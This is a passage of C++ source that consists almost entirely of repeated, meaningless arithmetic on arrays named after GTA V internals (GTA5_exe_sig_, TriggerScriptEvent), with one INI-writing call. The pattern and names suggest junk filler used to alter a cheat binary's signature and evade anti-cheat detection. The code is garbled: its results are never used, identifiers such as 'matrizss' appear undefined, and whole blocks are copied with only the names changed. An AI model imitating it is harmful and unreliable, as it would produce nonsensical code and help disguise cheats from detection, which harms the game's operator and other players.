				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				WritePrivateProfileStringA(app.c_str(), key.c_str(), string.c_str(), INIFilePath.c_str());
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
